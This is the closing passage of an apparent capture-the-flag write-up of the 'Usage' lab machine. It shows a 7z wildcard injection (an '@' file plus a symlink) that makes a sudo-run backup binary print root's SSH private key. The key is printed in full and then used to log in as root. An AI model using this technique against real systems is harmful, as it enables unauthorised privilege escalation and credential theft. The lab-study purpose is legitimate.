</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Invalid choice.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><ul><li>As expected, selecting different options trigger different functions. Analyzing <code>resetAdminPassword</code> function (the one executed if we select option <code>3</code> in the binary) literally does nothing. Just prints a message:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>resetAdminPassword</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Password has been reset.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><ul><li>But <code>backupWebContent</code> function (the one that is executed if we select the option <code>1. Project Backup</code>) seems interesting:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>backupWebContent</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>iVar1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=n>iVar1</span> <span class=o>=</span> <span class=nf>chdir</span><span class=p>(</span><span class=s>&#34;/var/www/html&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>iVar1</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;Error changing working directory to /var/www/html&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>It is executing with <code>system</code> <code>7z</code> to create a backup. However, the &ldquo;vulnerable&rdquo; part here is the <code>*</code> (wildcard) symbol.</p><ul><li>Checking at <a href=https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z class=external-link target=_blank rel=noopener>HackTricks how to exploit wildcards with 7z</a> we see that we are able to read files owned by <code>root</code> user. The steps explained in the page are:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>cd /path/to/7z/acting/folder
</span></span></span><span class=line><span class=cl><span class=go>touch @root.txt
</span></span></span><span class=line><span class=cl><span class=go>ln -s /file/you/want/to/read root.txt
</span></span></span></code></pre></div><p>so we modify it for our purposes. As can be seen at <code>backupWebContent</code> function the <code>7z</code> &ldquo;acting folder&rdquo; is <code>/var/www/html</code>. We can attempt to read <code>/root/root.txt</code> file or, to gain access as <code>root</code> user, attempt to read <code>/root/.ssh/id_rsa</code> file (hoping it exists). So we run in the victim machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>xander@usage:/tmp$ cd /var/www/html
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>xander@usage:/var/www/html$ touch @id_rsa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>xander@usage:/var/www/html$ sudo /usr/bin/usage_management
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Choose an option:
</span></span></span><span class=line><span class=cl><span class=go>1. Project Backup
</span></span></span><span class=line><span class=cl><span class=go>2. Backup MySQL data
</span></span></span><span class=line><span class=cl><span class=go>3. Reset admin password
</span></span></span><span class=line><span class=cl><span class=go>Enter your choice (1/2/3): 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
</span></span></span><span class=line><span class=cl><span class=go>p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Xeon(R) Gold 5218 CPU @ 2.30GHz (50657),ASM,AES-NI)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Open archive: /var/backups/project.zip
</span></span></span><span class=line><span class=cl><span class=go>--
</span></span></span><span class=line><span class=cl><span class=go>Path = /var/backups/project.zip
</span></span></span><span class=line><span class=cl><span class=go>Type = zip
</span></span></span><span class=line><span class=cl><span class=go>Physical Size = 54830415
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Scanning the drive:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WARNING: No more files
</span></span></span><span class=line><span class=cl><span class=go>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WARNING: No more files
</span></span></span><span class=line><span class=cl><span class=go>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WARNING: No more files
</span></span></span><span class=line><span class=cl><span class=go>QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WARNING: No more files
</span></span></span><span class=line><span class=cl><span class=go>QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WARNING: No more files
</span></span></span><span class=line><span class=cl><span class=go>AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WARNING: No more files
</span></span></span><span class=line><span class=cl><span class=go>H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WARNING: No more files
</span></span></span><span class=line><span class=cl><span class=go>-----END OPENSSH PRIVATE KEY-----
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2984 folders, 17948 files, 113879509 bytes (109 MiB)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Updating archive: /var/backups/project.zip
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Items to compress: 20932
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Files read from disk: 17948
</span></span></span><span class=line><span class=cl><span class=go>Archive size: 54830556 bytes (53 MiB)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Scan WARNINGS for files and folders:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-----BEGIN OPENSSH PRIVATE KEY----- : No more files
</span></span></span><span class=line><span class=cl><span class=go>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
</span></span></span><span class=line><span class=cl><span class=go>QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
</span></span></span><span class=line><span class=cl><span class=go>QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
</span></span></span><span class=line><span class=cl><span class=go>AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
</span></span></span><span class=line><span class=cl><span class=go>H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
</span></span></span><span class=line><span class=cl><span class=go>-----END OPENSSH PRIVATE KEY----- : No more files
</span></span></span><span class=line><span class=cl><span class=go>----------------
</span></span></span><span class=line><span class=cl><span class=go>Scan WARNINGS: 7
</span></span></span></code></pre></div><p>where we can see the <code>SSH</code> key, but split on parts.</p><ul><li>I &ldquo;rebuild&rdquo; the key and save it in my attacker machine:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat id_rsa_root
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span></span><span class=line><span class=cl><span class=go>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
</span></span></span><span class=line><span class=cl><span class=go>QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
</span></span></span><span class=line><span class=cl><span class=go>QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
</span></span></span><span class=line><span class=cl><span class=go>AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
</span></span></span><span class=line><span class=cl><span class=go>H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
</span></span></span><span class=line><span class=cl><span class=go>-----END OPENSSH PRIVATE KEY-----
</span></span></span></code></pre></div><p>Connect to the target machine as <code>root</code> user via <code>SSH</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ chmod 600 id_rsa_root
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ssh -i id_rsa_root root@10.10.11.18
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>root@usage:~# whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>root
</span></span></span></code></pre></div><p>and we can read the <code>root</code> flag at <code>/root</code></p><p>~ Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>